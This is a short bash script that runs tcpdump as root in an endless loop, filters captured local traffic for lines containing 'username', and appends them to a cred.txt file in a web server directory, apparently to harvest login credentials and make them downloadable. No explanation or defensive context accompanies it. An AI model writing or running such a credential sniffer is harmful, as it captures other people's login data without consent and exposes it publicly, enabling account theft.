#!/usr/bin/bash

while true;
do
sudo tcpdump -i any -v src 127.0.0.1 | grep --color=auto --color=none "username" --line-buffered>>/var/www/anything.com/cred.txt
done
